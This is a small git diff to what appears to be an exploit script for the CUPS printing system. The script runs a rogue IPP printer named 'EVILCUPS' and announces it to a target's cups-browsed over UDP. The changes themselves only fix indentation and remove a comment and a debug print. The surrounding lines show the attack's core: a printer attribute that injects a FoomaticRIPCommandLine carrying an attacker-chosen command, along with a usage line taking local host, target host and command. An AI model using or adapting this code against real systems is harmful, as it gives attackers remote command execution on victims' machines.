@@ -165,7 +165,7 @@ class MaliciousPrinter(behaviour.StatelessPrinter):
                 SectionEnum.printer,
                 b'printer-more-info',
                 TagEnum.uri
-                ): [f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],
+            ): [f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],
 
         }
         attr.update(super().minimal_attributes())
@@ -183,8 +183,6 @@ class MaliciousPrinter(behaviour.StatelessPrinter):
 
 def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
     print(f"Sending udp packet to {ip}:{port}...")
-
-    # Get a random number between 0 and 100
     printer_type = 2
     printer_state = '3'
     printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/EVILCUPS'
@@ -209,7 +207,6 @@ def run_server(server):
 
 if __name__ == "__main__":
     if len(sys.argv) != 4:
-        print(len(sys.argv))
         print("%s <LOCAL_HOST> <TARGET_HOST> <COMMAND>" % sys.argv[0])
         quit()
 
